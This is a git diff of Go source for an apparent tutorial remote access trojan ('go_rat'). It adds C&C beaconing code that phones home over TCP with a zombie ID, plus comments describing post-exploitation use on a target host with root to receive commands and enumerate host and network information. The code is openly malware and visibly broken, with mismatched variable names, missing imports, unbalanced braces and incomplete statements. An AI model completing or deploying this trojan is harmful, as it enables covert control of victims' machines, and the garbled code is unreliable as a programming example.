@@ -17,18 +17,32 @@ import (
 
 
 	/*/
-	"go_rat/pkg/rat_shared_code"
+	"go_rat/pkg/Rat_shared_code"
 	"net"
 	"strings"
 )
 
-// Beacon
+// Beacons
+// TODO: "strange" ways of reaching out
 // makes requests outside the network to get to the C&C
-// ONLY used for reaching out with TCP
-func BaconTCP() {
+
+//used for reaching out with regular TCP connection, this will hand off to regular connection
+// if a "good password *HINT*" is provided
+// put the id of the entity connecting to let the host know it's us
+func BaconTCP(zombie_ID string) {
 	rat_shared_code.PHONEHOME_TCP.IP = net.IP(rat_shared_code.Remote_tcpaddr)
-	net.DialTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN, &rat_shared_code.PHONEHOME_TCP)
-}
+	connection, error := net.DialTCP("tcp", &rat_shared_code.Local_tcpaddr_LAN, &rat_shared_code.PHONEHOME_TCP)
+	if err != nil {
+			// print the error
+			rat_shared_code.Error_printer(err, "[-] Error: TCP Beacon handshake Failed")
+			return
+		}
+		for {
+			netData, error := bufio.NewReader(connection).ReadString('\n')
+
+		}
+	}
+	
 
 // Same for UDP
 func BeaconUDP() {
@@ -38,7 +52,7 @@ func BeaconHTTP() {
 
 }
 BeaconDNS(){
-
+	Mdns_server.
 }
 /*
 function to hash a string to compare against the hardcoded password
@@ -47,8 +61,6 @@ function to hash a string to compare against the hardcoded password
 
  For the porpoises of this tutorial, we use a weak password.
 */
-
-var new_command_for_q rat_shared_code.Command
 
 // function to provide outbound connections via threading
 //-----------------Local IP---------Remote IP---------PORT-------
@@ -75,12 +87,8 @@ func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 			fmt.Println(error)
 			return
 		}
-		rat_shared_code.Json_extract(netData, new_command_for_q)
-		// stops server if "STOP" Command is sent
-		// TODO: JSONIFY THIS
-		if strings.TrimSpace(string(netData)) == "STOP" {
-			fmt.Println("Exiting TCP server!")
-			return
+		rat_shared_code.Json_extract(netData)
+
 		}
 		//sending wat!?!?
 		//connection.Write("asdf")
@@ -105,7 +113,7 @@ func Tcp_network_io() {
 
 // once placed on the target host and executed post exploitation, prefferably with root
 /// level permissions, We need to:
-//	- send a beacon with a conditional dependant on environment
+//	- send a beacon with a conditional dependant on environment/preference
 // 	- run the input/output operations if that environment is right
 //  - enumerate host intel, either passively or aggressively
 //  - enumerate network information
@@ -123,8 +131,14 @@ Goroutines run in the same address space, so access to shared memory must be syn
 /*/
 func main() {
 	if BEACON_ON_START == true{
-		switch BACON_TYPE:
-	case "tcp"
+		switch BACON_TYPE{
+			case "tcp":
+				go BaconTCP()
+			case "udp":
+				go BeaconUDP()
+			case "http":
+				go BeaconHTTP()
+	}
 	}
 	rat_shared_code.GetTCPConnections()
 }
